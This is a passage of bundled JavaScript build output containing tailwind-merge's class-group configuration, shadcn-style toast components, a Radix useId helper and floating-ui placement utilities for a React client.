       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-ee": [{
        "rounded-ee": [borderRadius]
      }],
      /**
       * Border Radius End Start
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-es": [{
        "rounded-es": [borderRadius]
      }],
      /**
       * Border Radius Top Left
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-tl": [{
        "rounded-tl": [borderRadius]
      }],
      /**
       * Border Radius Top Right
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-tr": [{
        "rounded-tr": [borderRadius]
      }],
      /**
       * Border Radius Bottom Right
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-br": [{
        "rounded-br": [borderRadius]
      }],
      /**
       * Border Radius Bottom Left
       * @see https://tailwindcss.com/docs/border-radius
       */
      "rounded-bl": [{
        "rounded-bl": [borderRadius]
      }],
      /**
       * Border Width
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w": [{
        border: [borderWidth]
      }],
      /**
       * Border Width X
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-x": [{
        "border-x": [borderWidth]
      }],
      /**
       * Border Width Y
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-y": [{
        "border-y": [borderWidth]
      }],
      /**
       * Border Width Start
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-s": [{
        "border-s": [borderWidth]
      }],
      /**
       * Border Width End
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-e": [{
        "border-e": [borderWidth]
      }],
      /**
       * Border Width Top
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-t": [{
        "border-t": [borderWidth]
      }],
      /**
       * Border Width Right
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-r": [{
        "border-r": [borderWidth]
      }],
      /**
       * Border Width Bottom
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-b": [{
        "border-b": [borderWidth]
      }],
      /**
       * Border Width Left
       * @see https://tailwindcss.com/docs/border-width
       */
      "border-w-l": [{
        "border-l": [borderWidth]
      }],
      /**
       * Border Opacity
       * @see https://tailwindcss.com/docs/border-opacity
       */
      "border-opacity": [{
        "border-opacity": [opacity]
      }],
      /**
       * Border Style
       * @see https://tailwindcss.com/docs/border-style
       */
      "border-style": [{
        border: [...getLineStyles(), "hidden"]
      }],
      /**
       * Divide Width X
       * @see https://tailwindcss.com/docs/divide-width
       */
      "divide-x": [{
        "divide-x": [borderWidth]
      }],
      /**
       * Divide Width X Reverse
       * @see https://tailwindcss.com/docs/divide-width
       */
      "divide-x-reverse": ["divide-x-reverse"],
      /**
       * Divide Width Y
       * @see https://tailwindcss.com/docs/divide-width
       */
      "divide-y": [{
        "divide-y": [borderWidth]
      }],
      /**
       * Divide Width Y Reverse
       * @see https://tailwindcss.com/docs/divide-width
       */
      "divide-y-reverse": ["divide-y-reverse"],
      /**
       * Divide Opacity
       * @see https://tailwindcss.com/docs/divide-opacity
       */
      "divide-opacity": [{
        "divide-opacity": [opacity]
      }],
      /**
       * Divide Style
       * @see https://tailwindcss.com/docs/divide-style
       */
      "divide-style": [{
        divide: getLineStyles()
      }],
      /**
       * Border Color
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color": [{
        border: [borderColor]
      }],
      /**
       * Border Color X
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-x": [{
        "border-x": [borderColor]
      }],
      /**
       * Border Color Y
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-y": [{
        "border-y": [borderColor]
      }],
      /**
       * Border Color S
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-s": [{
        "border-s": [borderColor]
      }],
      /**
       * Border Color E
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-e": [{
        "border-e": [borderColor]
      }],
      /**
       * Border Color Top
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-t": [{
        "border-t": [borderColor]
      }],
      /**
       * Border Color Right
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-r": [{
        "border-r": [borderColor]
      }],
      /**
       * Border Color Bottom
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-b": [{
        "border-b": [borderColor]
      }],
      /**
       * Border Color Left
       * @see https://tailwindcss.com/docs/border-color
       */
      "border-color-l": [{
        "border-l": [borderColor]
      }],
      /**
       * Divide Color
       * @see https://tailwindcss.com/docs/divide-color
       */
      "divide-color": [{
        divide: [borderColor]
      }],
      /**
       * Outline Style
       * @see https://tailwindcss.com/docs/outline-style
       */
      "outline-style": [{
        outline: ["", ...getLineStyles()]
      }],
      /**
       * Outline Offset
       * @see https://tailwindcss.com/docs/outline-offset
       */
      "outline-offset": [{
        "outline-offset": [isLength, isArbitraryValue]
      }],
      /**
       * Outline Width
       * @see https://tailwindcss.com/docs/outline-width
       */
      "outline-w": [{
        outline: [isLength, isArbitraryLength]
      }],
      /**
       * Outline Color
       * @see https://tailwindcss.com/docs/outline-color
       */
      "outline-color": [{
        outline: [colors]
      }],
      /**
       * Ring Width
       * @see https://tailwindcss.com/docs/ring-width
       */
      "ring-w": [{
        ring: getLengthWithEmptyAndArbitrary()
      }],
      /**
       * Ring Width Inset
       * @see https://tailwindcss.com/docs/ring-width
       */
      "ring-w-inset": ["ring-inset"],
      /**
       * Ring Color
       * @see https://tailwindcss.com/docs/ring-color
       */
      "ring-color": [{
        ring: [colors]
      }],
      /**
       * Ring Opacity
       * @see https://tailwindcss.com/docs/ring-opacity
       */
      "ring-opacity": [{
        "ring-opacity": [opacity]
      }],
      /**
       * Ring Offset Width
       * @see https://tailwindcss.com/docs/ring-offset-width
       */
      "ring-offset-w": [{
        "ring-offset": [isLength, isArbitraryLength]
      }],
      /**
       * Ring Offset Color
       * @see https://tailwindcss.com/docs/ring-offset-color
       */
      "ring-offset-color": [{
        "ring-offset": [colors]
      }],
      // Effects
      /**
       * Box Shadow
       * @see https://tailwindcss.com/docs/box-shadow
       */
      shadow: [{
        shadow: ["", "inner", "none", isTshirtSize, isArbitraryShadow]
      }],
      /**
       * Box Shadow Color
       * @see https://tailwindcss.com/docs/box-shadow-color
       */
      "shadow-color": [{
        shadow: [isAny]
      }],
      /**
       * Opacity
       * @see https://tailwindcss.com/docs/opacity
       */
      opacity: [{
        opacity: [opacity]
      }],
      /**
       * Mix Blend Mode
       * @see https://tailwindcss.com/docs/mix-blend-mode
       */
      "mix-blend": [{
        "mix-blend": [...getBlendModes(), "plus-lighter", "plus-darker"]
      }],
      /**
       * Background Blend Mode
       * @see https://tailwindcss.com/docs/background-blend-mode
       */
      "bg-blend": [{
        "bg-blend": getBlendModes()
      }],
      // Filters
      /**
       * Filter
       * @deprecated since Tailwind CSS v3.0.0
       * @see https://tailwindcss.com/docs/filter
       */
      filter: [{
        filter: ["", "none"]
      }],
      /**
       * Blur
       * @see https://tailwindcss.com/docs/blur
       */
      blur: [{
        blur: [blur]
      }],
      /**
       * Brightness
       * @see https://tailwindcss.com/docs/brightness
       */
      brightness: [{
        brightness: [brightness]
      }],
      /**
       * Contrast
       * @see https://tailwindcss.com/docs/contrast
       */
      contrast: [{
        contrast: [contrast]
      }],
      /**
       * Drop Shadow
       * @see https://tailwindcss.com/docs/drop-shadow
       */
      "drop-shadow": [{
        "drop-shadow": ["", "none", isTshirtSize, isArbitraryValue]
      }],
      /**
       * Grayscale
       * @see https://tailwindcss.com/docs/grayscale
       */
      grayscale: [{
        grayscale: [grayscale]
      }],
      /**
       * Hue Rotate
       * @see https://tailwindcss.com/docs/hue-rotate
       */
      "hue-rotate": [{
        "hue-rotate": [hueRotate]
      }],
      /**
       * Invert
       * @see https://tailwindcss.com/docs/invert
       */
      invert: [{
        invert: [invert]
      }],
      /**
       * Saturate
       * @see https://tailwindcss.com/docs/saturate
       */
      saturate: [{
        saturate: [saturate]
      }],
      /**
       * Sepia
       * @see https://tailwindcss.com/docs/sepia
       */
      sepia: [{
        sepia: [sepia]
      }],
      /**
       * Backdrop Filter
       * @deprecated since Tailwind CSS v3.0.0
       * @see https://tailwindcss.com/docs/backdrop-filter
       */
      "backdrop-filter": [{
        "backdrop-filter": ["", "none"]
      }],
      /**
       * Backdrop Blur
       * @see https://tailwindcss.com/docs/backdrop-blur
       */
      "backdrop-blur": [{
        "backdrop-blur": [blur]
      }],
      /**
       * Backdrop Brightness
       * @see https://tailwindcss.com/docs/backdrop-brightness
       */
      "backdrop-brightness": [{
        "backdrop-brightness": [brightness]
      }],
      /**
       * Backdrop Contrast
       * @see https://tailwindcss.com/docs/backdrop-contrast
       */
      "backdrop-contrast": [{
        "backdrop-contrast": [contrast]
      }],
      /**
       * Backdrop Grayscale
       * @see https://tailwindcss.com/docs/backdrop-grayscale
       */
      "backdrop-grayscale": [{
        "backdrop-grayscale": [grayscale]
      }],
      /**
       * Backdrop Hue Rotate
       * @see https://tailwindcss.com/docs/backdrop-hue-rotate
       */
      "backdrop-hue-rotate": [{
        "backdrop-hue-rotate": [hueRotate]
      }],
      /**
       * Backdrop Invert
       * @see https://tailwindcss.com/docs/backdrop-invert
       */
      "backdrop-invert": [{
        "backdrop-invert": [invert]
      }],
      /**
       * Backdrop Opacity
       * @see https://tailwindcss.com/docs/backdrop-opacity
       */
      "backdrop-opacity": [{
        "backdrop-opacity": [opacity]
      }],
      /**
       * Backdrop Saturate
       * @see https://tailwindcss.com/docs/backdrop-saturate
       */
      "backdrop-saturate": [{
        "backdrop-saturate": [saturate]
      }],
      /**
       * Backdrop Sepia
       * @see https://tailwindcss.com/docs/backdrop-sepia
       */
      "backdrop-sepia": [{
        "backdrop-sepia": [sepia]
      }],
      // Tables
      /**
       * Border Collapse
       * @see https://tailwindcss.com/docs/border-collapse
       */
      "border-collapse": [{
        border: ["collapse", "separate"]
      }],
      /**
       * Border Spacing
       * @see https://tailwindcss.com/docs/border-spacing
       */
      "border-spacing": [{
        "border-spacing": [borderSpacing]
      }],
      /**
       * Border Spacing X
       * @see https://tailwindcss.com/docs/border-spacing
       */
      "border-spacing-x": [{
        "border-spacing-x": [borderSpacing]
      }],
      /**
       * Border Spacing Y
       * @see https://tailwindcss.com/docs/border-spacing
       */
      "border-spacing-y": [{
        "border-spacing-y": [borderSpacing]
      }],
      /**
       * Table Layout
       * @see https://tailwindcss.com/docs/table-layout
       */
      "table-layout": [{
        table: ["auto", "fixed"]
      }],
      /**
       * Caption Side
       * @see https://tailwindcss.com/docs/caption-side
       */
      caption: [{
        caption: ["top", "bottom"]
      }],
      // Transitions and Animation
      /**
       * Tranisition Property
       * @see https://tailwindcss.com/docs/transition-property
       */
      transition: [{
        transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", isArbitraryValue]
      }],
      /**
       * Transition Duration
       * @see https://tailwindcss.com/docs/transition-duration
       */
      duration: [{
        duration: getNumberAndArbitrary()
      }],
      /**
       * Transition Timing Function
       * @see https://tailwindcss.com/docs/transition-timing-function
       */
      ease: [{
        ease: ["linear", "in", "out", "in-out", isArbitraryValue]
      }],
      /**
       * Transition Delay
       * @see https://tailwindcss.com/docs/transition-delay
       */
      delay: [{
        delay: getNumberAndArbitrary()
      }],
      /**
       * Animation
       * @see https://tailwindcss.com/docs/animation
       */
      animate: [{
        animate: ["none", "spin", "ping", "pulse", "bounce", isArbitraryValue]
      }],
      // Transforms
      /**
       * Transform
       * @see https://tailwindcss.com/docs/transform
       */
      transform: [{
        transform: ["", "gpu", "none"]
      }],
      /**
       * Scale
       * @see https://tailwindcss.com/docs/scale
       */
      scale: [{
        scale: [scale]
      }],
      /**
       * Scale X
       * @see https://tailwindcss.com/docs/scale
       */
      "scale-x": [{
        "scale-x": [scale]
      }],
      /**
       * Scale Y
       * @see https://tailwindcss.com/docs/scale
       */
      "scale-y": [{
        "scale-y": [scale]
      }],
      /**
       * Rotate
       * @see https://tailwindcss.com/docs/rotate
       */
      rotate: [{
        rotate: [isInteger, isArbitraryValue]
      }],
      /**
       * Translate X
       * @see https://tailwindcss.com/docs/translate
       */
      "translate-x": [{
        "translate-x": [translate]
      }],
      /**
       * Translate Y
       * @see https://tailwindcss.com/docs/translate
       */
      "translate-y": [{
        "translate-y": [translate]
      }],
      /**
       * Skew X
       * @see https://tailwindcss.com/docs/skew
       */
      "skew-x": [{
        "skew-x": [skew]
      }],
      /**
       * Skew Y
       * @see https://tailwindcss.com/docs/skew
       */
      "skew-y": [{
        "skew-y": [skew]
      }],
      /**
       * Transform Origin
       * @see https://tailwindcss.com/docs/transform-origin
       */
      "transform-origin": [{
        origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", isArbitraryValue]
      }],
      // Interactivity
      /**
       * Accent Color
       * @see https://tailwindcss.com/docs/accent-color
       */
      accent: [{
        accent: ["auto", colors]
      }],
      /**
       * Appearance
       * @see https://tailwindcss.com/docs/appearance
       */
      appearance: [{
        appearance: ["none", "auto"]
      }],
      /**
       * Cursor
       * @see https://tailwindcss.com/docs/cursor
       */
      cursor: [{
        cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", isArbitraryValue]
      }],
      /**
       * Caret Color
       * @see https://tailwindcss.com/docs/just-in-time-mode#caret-color-utilities
       */
      "caret-color": [{
        caret: [colors]
      }],
      /**
       * Pointer Events
       * @see https://tailwindcss.com/docs/pointer-events
       */
      "pointer-events": [{
        "pointer-events": ["none", "auto"]
      }],
      /**
       * Resize
       * @see https://tailwindcss.com/docs/resize
       */
      resize: [{
        resize: ["none", "y", "x", ""]
      }],
      /**
       * Scroll Behavior
       * @see https://tailwindcss.com/docs/scroll-behavior
       */
      "scroll-behavior": [{
        scroll: ["auto", "smooth"]
      }],
      /**
       * Scroll Margin
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-m": [{
        "scroll-m": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin X
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-mx": [{
        "scroll-mx": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin Y
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-my": [{
        "scroll-my": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin Start
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-ms": [{
        "scroll-ms": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin End
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-me": [{
        "scroll-me": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin Top
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-mt": [{
        "scroll-mt": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin Right
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-mr": [{
        "scroll-mr": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin Bottom
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-mb": [{
        "scroll-mb": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Margin Left
       * @see https://tailwindcss.com/docs/scroll-margin
       */
      "scroll-ml": [{
        "scroll-ml": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-p": [{
        "scroll-p": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding X
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-px": [{
        "scroll-px": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding Y
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-py": [{
        "scroll-py": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding Start
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-ps": [{
        "scroll-ps": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding End
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-pe": [{
        "scroll-pe": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding Top
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-pt": [{
        "scroll-pt": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding Right
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-pr": [{
        "scroll-pr": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding Bottom
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-pb": [{
        "scroll-pb": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Padding Left
       * @see https://tailwindcss.com/docs/scroll-padding
       */
      "scroll-pl": [{
        "scroll-pl": getSpacingWithArbitrary()
      }],
      /**
       * Scroll Snap Align
       * @see https://tailwindcss.com/docs/scroll-snap-align
       */
      "snap-align": [{
        snap: ["start", "end", "center", "align-none"]
      }],
      /**
       * Scroll Snap Stop
       * @see https://tailwindcss.com/docs/scroll-snap-stop
       */
      "snap-stop": [{
        snap: ["normal", "always"]
      }],
      /**
       * Scroll Snap Type
       * @see https://tailwindcss.com/docs/scroll-snap-type
       */
      "snap-type": [{
        snap: ["none", "x", "y", "both"]
      }],
      /**
       * Scroll Snap Type Strictness
       * @see https://tailwindcss.com/docs/scroll-snap-type
       */
      "snap-strictness": [{
        snap: ["mandatory", "proximity"]
      }],
      /**
       * Touch Action
       * @see https://tailwindcss.com/docs/touch-action
       */
      touch: [{
        touch: ["auto", "none", "manipulation"]
      }],
      /**
       * Touch Action X
       * @see https://tailwindcss.com/docs/touch-action
       */
      "touch-x": [{
        "touch-pan": ["x", "left", "right"]
      }],
      /**
       * Touch Action Y
       * @see https://tailwindcss.com/docs/touch-action
       */
      "touch-y": [{
        "touch-pan": ["y", "up", "down"]
      }],
      /**
       * Touch Action Pinch Zoom
       * @see https://tailwindcss.com/docs/touch-action
       */
      "touch-pz": ["touch-pinch-zoom"],
      /**
       * User Select
       * @see https://tailwindcss.com/docs/user-select
       */
      select: [{
        select: ["none", "text", "all", "auto"]
      }],
      /**
       * Will Change
       * @see https://tailwindcss.com/docs/will-change
       */
      "will-change": [{
        "will-change": ["auto", "scroll", "contents", "transform", isArbitraryValue]
      }],
      // SVG
      /**
       * Fill
       * @see https://tailwindcss.com/docs/fill
       */
      fill: [{
        fill: [colors, "none"]
      }],
      /**
       * Stroke Width
       * @see https://tailwindcss.com/docs/stroke-width
       */
      "stroke-w": [{
        stroke: [isLength, isArbitraryLength, isArbitraryNumber]
      }],
      /**
       * Stroke
       * @see https://tailwindcss.com/docs/stroke
       */
      stroke: [{
        stroke: [colors, "none"]
      }],
      // Accessibility
      /**
       * Screen Readers
       * @see https://tailwindcss.com/docs/screen-readers
       */
      sr: ["sr-only", "not-sr-only"],
      /**
       * Forced Color Adjust
       * @see https://tailwindcss.com/docs/forced-color-adjust
       */
      "forced-color-adjust": [{
        "forced-color-adjust": ["auto", "none"]
      }]
    },
    conflictingClassGroups: {
      overflow: ["overflow-x", "overflow-y"],
      overscroll: ["overscroll-x", "overscroll-y"],
      inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
      "inset-x": ["right", "left"],
      "inset-y": ["top", "bottom"],
      flex: ["basis", "grow", "shrink"],
      gap: ["gap-x", "gap-y"],
      p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
      px: ["pr", "pl"],
      py: ["pt", "pb"],
      m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
      mx: ["mr", "ml"],
      my: ["mt", "mb"],
      size: ["w", "h"],
      "font-size": ["leading"],
      "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
      "fvn-ordinal": ["fvn-normal"],
      "fvn-slashed-zero": ["fvn-normal"],
      "fvn-figure": ["fvn-normal"],
      "fvn-spacing": ["fvn-normal"],
      "fvn-fraction": ["fvn-normal"],
      "line-clamp": ["display", "overflow"],
      rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
      "rounded-s": ["rounded-ss", "rounded-es"],
      "rounded-e": ["rounded-se", "rounded-ee"],
      "rounded-t": ["rounded-tl", "rounded-tr"],
      "rounded-r": ["rounded-tr", "rounded-br"],
      "rounded-b": ["rounded-br", "rounded-bl"],
      "rounded-l": ["rounded-tl", "rounded-bl"],
      "border-spacing": ["border-spacing-x", "border-spacing-y"],
      "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
      "border-w-x": ["border-w-r", "border-w-l"],
      "border-w-y": ["border-w-t", "border-w-b"],
      "border-color": ["border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
      "border-color-x": ["border-color-r", "border-color-l"],
      "border-color-y": ["border-color-t", "border-color-b"],
      "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
      "scroll-mx": ["scroll-mr", "scroll-ml"],
      "scroll-my": ["scroll-mt", "scroll-mb"],
      "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
      "scroll-px": ["scroll-pr", "scroll-pl"],
      "scroll-py": ["scroll-pt", "scroll-pb"],
      touch: ["touch-x", "touch-y", "touch-pz"],
      "touch-x": ["touch"],
      "touch-y": ["touch"],
      "touch-pz": ["touch"]
    },
    conflictingClassGroupModifiers: {
      "font-size": ["leading"]
    }
  };
};
var twMerge = /* @__PURE__ */ createTailwindMerge(getDefaultConfig);

// client/src/lib/utils.ts
function cn(...inputs) {
  return twMerge(clsx(inputs));
}

// client/src/components/ui/toast.tsx
import { jsx as jsx11 } from "react/jsx-runtime";
var ToastProvider2 = Provider;
var ToastViewport2 = React26.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx11(
  Viewport,
  {
    ref,
    className: cn(
      "fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",
      className
    ),
    ...props
  }
));
ToastViewport2.displayName = Viewport.displayName;
var toastVariants = cva(
  "group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full",
  {
    variants: {
      variant: {
        default: "border bg-background text-foreground",
        destructive: "destructive group border-destructive bg-destructive text-destructive-foreground"
      }
    },
    defaultVariants: {
      variant: "default"
    }
  }
);
var Toast2 = React26.forwardRef(({ className, variant, ...props }, ref) => {
  return /* @__PURE__ */ jsx11(
    Root22,
    {
      ref,
      className: cn(toastVariants({ variant }), className),
      ...props
    }
  );
});
Toast2.displayName = Root22.displayName;
var ToastAction2 = React26.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx11(
  Action,
  {
    ref,
    className: cn(
      "inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",
      className
    ),
    ...props
  }
));
ToastAction2.displayName = Action.displayName;
var ToastClose2 = React26.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx11(
  Close,
  {
    ref,
    className: cn(
      "absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",
      className
    ),
    "toast-close": "",
    ...props,
    children: /* @__PURE__ */ jsx11(X, { className: "h-4 w-4" })
  }
));
ToastClose2.displayName = Close.displayName;
var ToastTitle2 = React26.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx11(
  Title,
  {
    ref,
    className: cn("text-sm font-semibold", className),
    ...props
  }
));
ToastTitle2.displayName = Title.displayName;
var ToastDescription2 = React26.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx11(
  Description,
  {
    ref,
    className: cn("text-sm opacity-90", className),
    ...props
  }
));
ToastDescription2.displayName = Description.displayName;

// client/src/components/ui/toaster.tsx
import { jsx as jsx12, jsxs as jsxs2 } from "react/jsx-runtime";
function Toaster() {
  const { toasts } = useToast();
  return /* @__PURE__ */ jsxs2(ToastProvider2, { children: [
    toasts.map(function({ id: id2, title, description, action, ...props }) {
      return /* @__PURE__ */ jsxs2(Toast2, { ...props, children: [
        /* @__PURE__ */ jsxs2("div", { className: "grid gap-1", children: [
          title && /* @__PURE__ */ jsx12(ToastTitle2, { children: title }),
          description && /* @__PURE__ */ jsx12(ToastDescription2, { children: description })
        ] }),
        action,
        /* @__PURE__ */ jsx12(ToastClose2, {})
      ] }, id2);
    }),
    /* @__PURE__ */ jsx12(ToastViewport2, {})
  ] });
}

// client/src/components/ui/tooltip.tsx
import * as React33 from "react";

// node_modules/@radix-ui/react-tooltip/dist/index.mjs
import * as React32 from "react";

// node_modules/@radix-ui/react-id/dist/index.mjs
import * as React27 from "react";
var useReactId = React27[" useId ".trim().toString()] || (() => void 0);
var count2 = 0;
function useId(deterministicId) {
  const [id2, setId] = React27.useState(useReactId());
  useLayoutEffect22(() => {
    if (!deterministicId) setId((reactId) => reactId ?? String(count2++));
  }, [deterministicId]);
  return deterministicId || (id2 ? `radix-${id2}` : "");
}

// node_modules/@radix-ui/react-popper/dist/index.mjs
import * as React31 from "react";

// node_modules/@floating-ui/utils/dist/floating-ui.utils.mjs
var sides = ["top", "right", "bottom", "left"];
var min = Math.min;
var max = Math.max;
var round = Math.round;
var floor = Math.floor;
var createCoords = (v) => ({
  x: v,
  y: v
});
var oppositeSideMap = {
  left: "right",
  right: "left",
  bottom: "top",
  top: "bottom"
};
var oppositeAlignmentMap = {
  start: "end",
  end: "start"
};
function clamp(start, value, end) {
  return max(start, min(value, end));
}
function evaluate(value, param) {
  return typeof value === "function" ? value(param) : value;
}
function getSide(placement) {
  return placement.split("-")[0];
}
function getAlignment(placement) {
  return placement.split("-")[1];
}
function getOppositeAxis(axis) {
  return axis === "x" ? "y" : "x";
}
function getAxisLength(axis) {
  return axis === "y" ? "height" : "width";
}
var yAxisSides = /* @__PURE__ */ new Set(["top", "bottom"]);
function getSideAxis(placement) {
  return yAxisSides.has(getSide(placement)) ? "y" : "x";
}
function getAlignmentAxis(placement) {
  return getOppositeAxis(getSideAxis(placement));
}
function getAlignmentSides(placement, rects, rtl) {
  if (rtl === void 0) {
    rtl = false;
  }
  const alignment = getAlignment(placement);
  const alignmentAxis = getAlignmentAxis(placement);
  const length = getAxisLength(alignmentAxis);
  let mainAlignmentSide = alignmentAxis === "x" ? alignment === (rtl ? "end" : "start") ? "right" : "left" : alignment === "start" ? "bottom" : "top";
  if (rects.reference[length] > rects.floating[length]) {
    mainAlignmentSide = getOppositePlacement(mainAlignmentSide);
  }
  return [mainAlignmentSide, getOppositePlacement(mainAlignmentSide)];
}
function getExpandedPlacements(placement) {
  const oppositePlacement = getOppositePlacement(placement);
  return [getOppositeAlignmentPlacement(placement), oppositePlacement, getOppositeAlignmentPlacement(oppositePlacement)];
}
function getOppositeAlignmentPlacement(placement) {
  return placement.replace(/start|end/g, (alignment) => oppositeAlignmentMap[alignment]);
}
var lrPlacement = ["left", "right"];
var rlPlacement = ["right", "left"];
var tbPlacement = ["top", "bottom"];
var btPlacement = ["bottom", "top"];
function getSideList(side, isStart, rtl) {
  switch (side) {
    case "top":
    case "bottom":
      if (rtl) return isStart ? rlPlacement : lrPlacement;
      return isStart ? lrPlacement : rlPlacement;
    case "left":
    case "right":
      return isStart ? tbPlacement : btPlacement;
    default:
      return [];
  }
}
function getOppositeAxisPlacements(placement, flipAlignment, direction, rtl) {
  const alignment = getAlignment(placement);
  let list = getSideList(getSide(placement), direction === "start", rtl);
  if (alignment) {
    list = list.map((side) => side + "-" + alignment);
    if (flipAlignment) {
      list = list.concat(list.map(getOppositeAlignmentPlacement));
    }
  }
  return list;
}
function getOppositePlacement(placement) {
  return placement.replace(/left|right|bottom|top/g, (side) => oppositeSideMap[side]);
}
function expandPaddingObject(padding) {
  return {
    top: 0,
    right: 0,
    bottom: 0,
    left: 0,
    ...padding
  };
}
function getPaddingObject(padding) {
  return typeof padding !== "number" ? expandPaddingObject(padding) : {
    top: padding,
    right: padding,
    bottom: padding,
    left: padding
  };
}
function rectToClientRect(rect) {
  const {
    x,
    y,
    width,
    height
  } = rect;
  return {
    width,
    height,
    top: y,
    left: x,
    right: x + width,
    bottom: y + height,
    x,
    y
  };
}

// node_modules/@floating-ui/core/dist/floating-ui.core.mjs
function computeCoordsFromPlacement(_ref, placement, rtl) {
  let {
    reference,
    floating
  } = _ref;
